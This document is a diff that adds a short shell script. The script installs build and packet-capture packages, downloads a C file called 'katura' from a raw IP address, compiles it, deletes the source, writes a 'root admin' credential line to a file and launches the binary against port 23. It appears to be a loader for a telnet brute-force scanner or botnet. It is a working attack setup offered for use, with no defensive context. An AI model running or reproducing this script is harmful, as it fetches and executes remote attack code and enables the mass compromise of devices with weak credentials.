@@ -1,0 +1,13 @@
+yum update -y
+yum install python-paramiko gcc screen nano wget httpd iptables perl -y
+yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+yum install epel-release -y
+yum install gengetopt -y
+yum install bzip2 -y
+yum install lbzip2 -y
+wget -q http://98.143.148.177/jacknzach/katura.c -O katura.c && gcc -o katura katura.c -pthread
+rm -rf katura.c
+echo Jack root admin >> katura.txt
+
+screen ./katura 23 1 1337
